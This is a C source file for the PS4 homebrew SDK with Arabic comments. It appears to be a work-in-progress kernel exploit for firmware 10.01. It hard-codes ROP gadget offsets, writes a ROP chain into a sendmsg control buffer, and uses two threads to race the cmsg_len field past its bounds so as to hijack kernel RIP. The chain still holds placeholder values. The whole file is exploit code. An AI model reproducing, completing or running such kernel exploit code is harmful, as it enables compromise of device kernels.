#include <ps4.h>

// الإزاحات لنسخة 10.01 (من القائمة التي وفرتها)
#define OFF_POP_RAX_RET          0x29974f 
#define OFF_POP_RDI_RET          0x510c4e 
#define OFF_POP_RSI_RET          0x2983e0 
#define OFF_PUSH_RSP_POP_RSI_RET 0xbb3ee6 
#define OFF_RET                  0x2008e0 

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

// دالة بناء الـ Payload بناءً على إزاحة 0x48 الناجحة
void build_payload(uint64_t kbase) {
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
    uint64_t pop_rdi = kbase + OFF_POP_RDI_RET;
    uint64_t pop_rsi = kbase + OFF_POP_RSI_RET;
    uint64_t jump_target = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t ret_gadget = kbase + OFF_RET;

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    /* خريطة المكدس بناءً على الـ Log الأخير:
       0x48 -> يذهب إلى RBP
       0x50 -> يذهب إلى RIP (بداية التنفيذ)
    */

    // 1. شحن RBP بعنوان آمن (مجرد RET) لمنع الانهيار المبكر
    *(uint64_t *)(control_buf + 0x48) = ret_gadget;

    // 2. التحكم في RIP: القفز إلى POP RAX
    *(uint64_t *)(control_buf + 0x50) = pop_rax;
    *(uint64_t *)(control_buf + 0x58) = 0x1111111111111111; // ستوضع في RAX

    // 3. القفز إلى POP RDI
    *(uint64_t *)(control_buf + 0x60) = pop_rdi;
    *(uint64_t *)(control_buf + 0x68) = 0x2222222222222222; // ستوضع في RDI

    // 4. القفز إلى POP RSI
    *(uint64_t *)(control_buf + 0x70) = pop_rsi;
    *(uint64_t *)(control_buf + 0x78) = 0x3333333333333333; // ستوضع في RSI

    // 5. الهدف النهائي (تغيير مسار المكدس أو Gadget إضافي)
    *(uint64_t *)(control_buf + 0x80) = jump_target;
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { 
        syscall(28, global_sock, &msg, 0); 
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;
        cmsg->cmsg_len = 0xFFFF; // كسر الحدود في الوقت المناسب
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    build_payload(kbase);

    global_sock = syscall(97, 2, 2, 0);
    if (global_sock < 0) return -1;

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
